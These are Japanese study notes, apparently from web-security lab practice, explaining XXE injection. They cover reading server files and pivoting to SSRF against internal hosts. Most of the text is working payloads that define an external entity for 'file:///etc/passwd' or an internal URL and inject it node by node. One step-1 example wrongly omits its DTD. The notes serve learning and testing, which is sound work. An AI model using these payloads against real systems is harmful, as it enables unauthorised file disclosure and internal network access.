## XXEi攻撃によるファイル取得

#### XXEiでのファイル取得方法

- 元のXML
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<stockCheck><productId>381</productId></stockCheck>
```

1. ファイルへのパスを含む外部エンティティを定義するDTDを導入or編集

```xml
<?xml version="1.0" encoding="UTF-8"?> 

<stockCheck><productId>381</productId></stockCheck>
```

2. レスポンスで返るXMLのデータノードを編集して外部エンティティを展開する
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```

###### 🚨注意：
- XML文書内のすべてのデータノードを個別にテストしていく必要がある。どのノードがアプリケーションのレスポンスとして使われるかがわからないので。
- ↓例
```xml
<!-- productId nodeのテスト-->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1001</storeId>
  <userId>5002</userId>
</stockCheck>

<!-- storeId nodeのテスト -->
...
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>381</productId>
  <storeId>&xxe;</storeId>
...

```

###### ファイル取得できる原理と具体例

- ショッピングアプリがXMLをサーバに送信して商品の在庫をチェックするとする
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>381</productId>
  <storeId>1001</storeId>
  <userId>5002</userId>
</stockCheck>
```

- XXEiに対する防御がない場合、XXEを注入
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1001</storeId>
  <userId>5002</userId>
</stockCheck>
```
- productIdノード内でそのエンティティを展開する。
- 同様に他のノードでも検証すること

## XXEによるSSRF攻撃の実行

#### XXEによるSSRF攻撃実行方法

- SSRFターゲットのURLに変更するだけ。あとは展開
```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://[internal.vulnerable-website.com]/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

- レスポンスがエラーとともにXXEiの結果を返すことがある
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 25

"Invalid product ID: [directory_name]"
```

- 入手した情報を元に、さらにSSRF攻撃を続行する
```dtd
<!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/[directory_name]"> ]
```

- ⚠もしデータノード内で定義したエンティティを展開できず、レスポンスが帰ってこない場合は[3.  Blind SSRF](../SSRF/3.%20%20Blind%20SSRF.md)へ
